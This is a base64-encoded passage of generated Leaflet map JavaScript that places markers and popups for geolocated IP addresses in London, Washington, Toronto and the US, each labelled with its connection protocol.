l0dWRlPS05Ny44MjIsIExhdGl0dWRlPTM3Ljc1MTxicj4yMC4zOC45OC4xNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2NiYmMxNDYyOTcxYjQwOGRiYmQyMjNkZDdmYzU1OWQ2LnNldENvbnRlbnQoaHRtbF83NThlZDE1MTgxNTk0MjA5YTVjNDkwMTc0N2U4ZGI2MSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2Q2YjUzZjcwMGQwZDQ5MjdiNjliMDI2YmU5YjEzZThmLmJpbmRQb3B1cChwb3B1cF9jYmJjMTQ2Mjk3MWI0MDhkYmJkMjIzZGQ3ZmM1NTlkNikKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZDZiNTNmNzAwZDBkNDkyN2I2OWIwMjZiZTliMTNlOGYuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTm9uZSwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9iMjE3MjgxYWM0Mjg0MzUyYWYxMjIwNWUzOTNlMjkwMiA9IEwubWFya2VyKAogICAgICAgICAgICBbNTEuNTE0MiwgLTAuMDkzMV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2Y3NWRhMmM5ZDliZjQ0M2ZiYjVjODI0OTEzMTZhZmYzID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2IyMTcyODFhYzQyODQzNTJhZjEyMjA1ZTM5M2UyOTAyLnNldEljb24oaWNvbl9mNzVkYTJjOWQ5YmY0NDNmYmI1YzgyNDkxMzE2YWZmMyk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8zZWJiYmM0OWNjZGU0ZTFiODFiYzA5MmY2YTg5NDQ2ZSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzFhMTMwYzg3YTEzMzRmMmY5MTlkZmJhMjFhNDc5YmIwID0gJChgPGRpdiBpZD0iaHRtbF8xYTEzMGM4N2ExMzM0ZjJmOTE5ZGZiYTIxYTQ3OWJiMCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9R0IsIENvdW50cnlOYW1lPVVuaXRlZCBLaW5nZG9tLCBTdGF0ZT1FbmdsYW5kLCBDaXR5PUxvbmRvbiwgTG9uZ2l0dWRlPS0wLjA5MzEsIExhdGl0dWRlPTUxLjUxNDI8YnI+OTEuMTg5Ljk0LjQ8YnI+cHJvdG9jb2w9bnRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF8zZWJiYmM0OWNjZGU0ZTFiODFiYzA5MmY2YTg5NDQ2ZS5zZXRDb250ZW50KGh0bWxfMWExMzBjODdhMTMzNGYyZjkxOWRmYmEyMWE0NzliYjApOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9iMjE3MjgxYWM0Mjg0MzUyYWYxMjIwNWUzOTNlMjkwMi5iaW5kUG9wdXAocG9wdXBfM2ViYmJjNDljY2RlNGUxYjgxYmMwOTJmNmE4OTQ0NmUpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2IyMTcyODFhYzQyODQzNTJhZjEyMjA1ZTM5M2UyOTAyLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYExvbmRvbiwgVW5pdGVkIEtpbmdkb20sIHByb3RvY29sPW50cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzc4NThkYTAwM2QwYTQ2OTk5MGFhOTRhYmQwMWE3NDc4ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszNy43NTEsIC05Ny44MjJdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl83NzgwNzUxMGZiZTM0OWIwYTEzY2M0OTg5NDk5NWE4ZSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl83ODU4ZGEwMDNkMGE0Njk5OTBhYTk0YWJkMDFhNzQ3OC5zZXRJY29uKGljb25fNzc4MDc1MTBmYmUzNDliMGExM2NjNDk4OTQ5OTVhOGUpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfOWE4YTMxODZiOTMwNGYxZmFiYmZlOWQwNWZiMjhlNGYgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8xOTE3YzVhNjQ4NGM0ZGNkOWIzMjVkYTEzZjA4OTFjZiA9ICQoYDxkaXYgaWQ9Imh0bWxfMTkxN2M1YTY0ODRjNGRjZDliMzI1ZGExM2YwODkxY2YiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBMb25naXR1ZGU9LTk3LjgyMiwgTGF0aXR1ZGU9MzcuNzUxPGJyPjIwLjM4Ljk4LjE2NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfOWE4YTMxODZiOTMwNGYxZmFiYmZlOWQwNWZiMjhlNGYuc2V0Q29udGVudChodG1sXzE5MTdjNWE2NDg0YzRkY2Q5YjMyNWRhMTNmMDg5MWNmKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNzg1OGRhMDAzZDBhNDY5OTkwYWE5NGFiZDAxYTc0NzguYmluZFBvcHVwKHBvcHVwXzlhOGEzMTg2YjkzMDRmMWZhYmJmZTlkMDVmYjI4ZTRmKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl83ODU4ZGEwMDNkMGE0Njk5OTBhYTk0YWJkMDFhNzQ3OC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBOb25lLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2VmOTVjYTM4NmJhYTQ3YTM4NjYxOWEwZDZmOWY2ZDk1ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzU5N2UxMjc2NGQxNTQ0NzlhZjY3NDgxNmIxNGJhZGRjID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2VmOTVjYTM4NmJhYTQ3YTM4NjYxOWEwZDZmOWY2ZDk1LnNldEljb24oaWNvbl81OTdlMTI3NjRkMTU0NDc5YWY2NzQ4MTZiMTRiYWRkYyk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF85NjNhNjAxZjcwOWE0MGFlOGRmMzE4YTkzODM0ZDlmZSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzkwODJkMzE3ZGQxYTRiZTQ5NjVhZDY0MTJhNjM2ZGYyID0gJChgPGRpdiBpZD0iaHRtbF85MDgyZDMxN2RkMWE0YmU0OTY1YWQ2NDEyYTYzNmRmMiIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4yMzkuMjIwLjY0PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF85NjNhNjAxZjcwOWE0MGFlOGRmMzE4YTkzODM0ZDlmZS5zZXRDb250ZW50KGh0bWxfOTA4MmQzMTdkZDFhNGJlNDk2NWFkNjQxMmE2MzZkZjIpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9lZjk1Y2EzODZiYWE0N2EzODY2MTlhMGQ2ZjlmNmQ5NS5iaW5kUG9wdXAocG9wdXBfOTYzYTYwMWY3MDlhNDBhZThkZjMxOGE5MzgzNGQ5ZmUpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2VmOTVjYTM4NmJhYTQ3YTM4NjYxOWEwZDZmOWY2ZDk1LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfYzIwYzFhZjI1YjE2NDU1ZGFjNjc4OWI4ZDEwZTY0NmMgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fNDZlNDIzZjBiNmFlNDEwZDgxZjAwN2ZmNzZiZmQ3MzUgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfYzIwYzFhZjI1YjE2NDU1ZGFjNjc4OWI4ZDEwZTY0NmMuc2V0SWNvbihpY29uXzQ2ZTQyM2YwYjZhZTQxMGQ4MWYwMDdmZjc2YmZkNzM1KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2FmMzRiYTNiNjFhMTQxMjg4YjUwMGZiMDkzNTQ3NzdjID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNzQ2Yzk4NzQwY2UzNDFjNDgzOTVhODE4OTM0YmJhYjIgPSAkKGA8ZGl2IGlkPSJodG1sXzc0NmM5ODc0MGNlMzQxYzQ4Mzk1YTgxODkzNGJiYWIyIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIzOS4yMjAuMzI8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2FmMzRiYTNiNjFhMTQxMjg4YjUwMGZiMDkzNTQ3NzdjLnNldENvbnRlbnQoaHRtbF83NDZjOTg3NDBjZTM0MWM0ODM5NWE4MTg5MzRiYmFiMik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2MyMGMxYWYyNWIxNjQ1NWRhYzY3ODliOGQxMGU2NDZjLmJpbmRQb3B1cChwb3B1cF9hZjM0YmEzYjYxYTE0MTI4OGI1MDBmYjA5MzU0Nzc3YykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfYzIwYzFhZjI1YjE2NDU1ZGFjNjc4OWI4ZDEwZTY0NmMuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl81NGQyOWM1ZjY3ZWY0YjlhOGNhM2QzMWQ2ODYwYzgwZCA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl8xMzFhMjc1ZjAwYzc0N2FjYjc5YTkzNTQ3OTQ0YWM5YiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl81NGQyOWM1ZjY3ZWY0YjlhOGNhM2QzMWQ2ODYwYzgwZC5zZXRJY29uKGljb25fMTMxYTI3NWYwMGM3NDdhY2I3OWE5MzU0Nzk0NGFjOWIpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfOTY2NDVkZGFkMTZkNDdhOTk2NWU5MGM2ZjBhNjUxZmQgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF8xMzdlYzZmNzg0MTY0N2M4OGZmMTFiNmY4MzM5YzA1MiA9ICQoYDxkaXYgaWQ9Imh0bWxfMTM3ZWM2Zjc4NDE2NDdjODhmZjExYjZmODMzOWMwNTIiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjEzLjcxLjE3Mi4xMjg8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzk2NjQ1ZGRhZDE2ZDQ3YTk5NjVlOTBjNmYwYTY1MWZkLnNldENvbnRlbnQoaHRtbF8xMzdlYzZmNzg0MTY0N2M4OGZmMTFiNmY4MzM5YzA1Mik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzU0ZDI5YzVmNjdlZjRiOWE4Y2EzZDMxZDY4NjBjODBkLmJpbmRQb3B1cChwb3B1cF85NjY0NWRkYWQxNmQ0N2E5OTY1ZTkwYzZmMGE2NTFmZCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfNTRkMjljNWY2N2VmNGI5YThjYTNkMzFkNjg2MGM4MGQuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzI0NzI1MzEwNzBjZTRhOGY5MjQyY2Q1ZWM0NmMxMDg5ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs1MS41MTQyLCAtMC4wOTMxXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZTgzMzExN2QxNzRlNDFiNmJjMmYyZDAwZjUxMGZkNGEgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMjQ3MjUzMTA3MGNlNGE4ZjkyNDJjZDVlYzQ2YzEwODkuc2V0SWNvbihpY29uX2U4MzMxMTdkMTc0ZTQxYjZiYzJmMmQwMGY1MTBmZDRhKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzAyYTgwMTNmNzAyMDQ0NzViZjU2YTcxZjZjNjllNGEwID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMThlYTExMGZiYjA2NGM1ZDk0NmZiNjFhYzViNGVmMDYgPSAkKGA8ZGl2IGlkPSJodG1sXzE4ZWExMTBmYmIwNjRjNWQ5NDZmYjYxYWM1YjRlZjA2IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1HQiwgQ291bnRyeU5hbWU9VW5pdGVkIEtpbmdkb20sIFN0YXRlPUVuZ2xhbmQsIENpdHk9TG9uZG9uLCBMb25naXR1ZGU9LTAuMDkzMSwgTGF0aXR1ZGU9NTEuNTE0Mjxicj45MS4xODkuODguMTQ5PGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzAyYTgwMTNmNzAyMDQ0NzViZjU2YTcxZjZjNjllNGEwLnNldENvbnRlbnQoaHRtbF8xOGVhMTEwZmJiMDY0YzVkOTQ2ZmI2MWFjNWI0ZWYwNik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzI0NzI1MzEwNzBjZTRhOGY5MjQyY2Q1ZWM0NmMxMDg5LmJpbmRQb3B1cChwb3B1cF8wMmE4MDEzZjcwMjA0NDc1YmY1NmE3MWY2YzY5ZTRhMCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMjQ3MjUzMTA3MGNlNGE4ZjkyNDJjZDVlYzQ2YzEwODkuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTG9uZG9uLCBVbml0ZWQgS2luZ2RvbSwgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2UzMTcyYjRhYmE3ODRkM2JhMDQ1OGU0MjkzN2YyOTMyID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2RkYTRjYjg3NDM3NDQyYzk4NTVlODcwYzlhOGM5ZGUxID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2UzMTcyYjRhYmE3ODRkM2JhMDQ1OGU0MjkzN2YyOTMyLnNldEljb24oaWNvbl9kZGE0Y2I4NzQzNzQ0MmM5ODU1ZTg3MGM5YThjOWRlMSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8wNDEwMjIzY2E5NDE0M2M0ODIxNWUxNGYyNWYzNzljYyA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzRkNjcwOWExNzhlOTRlYWFhMzQ2MmY0MmJhOGY4OGEwID0gJChgPGRpdiBpZD0iaHRtbF80ZDY3MDlhMTc4ZTk0ZWFhYTM0NjJmNDJiYThmODhhMCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4xNjguNTAuNzk8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfMDQxMDIyM2NhOTQxNDNjNDgyMTVlMTRmMjVmMzc5Y2Muc2V0Q29udGVudChodG1sXzRkNjcwOWExNzhlOTRlYWFhMzQ2MmY0MmJhOGY4OGEwKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfZTMxNzJiNGFiYTc4NGQzYmEwNDU4ZTQyOTM3ZjI5MzIuYmluZFBvcHVwKHBvcHVwXzA0MTAyMjNjYTk0MTQzYzQ4MjE1ZTE0ZjI1ZjM3OWNjKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9lMzE3MmI0YWJhNzg0ZDNiYTA0NThlNDI5MzdmMjkzMi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfNjhkZWRlZDdkM2VmNGQwM2E5ODI0NWRhMzViNTIxZDcgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fYTZmMDQzNGNhZTNjNDNjYmJkZDM2YjljODJiYWQ1MTAgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfNjhkZWRlZDdkM2VmNGQwM2E5ODI0NWRhMzViNTIxZDcuc2V0SWNvbihpY29uX2E2ZjA0MzRjYWUzYzQzY2JiZGQzNmI5YzgyYmFkNTEwKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzEyZWRlNTYwMzAyOTQ1NjNiMGYwNDIyZmE3YmU4OWI5ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAg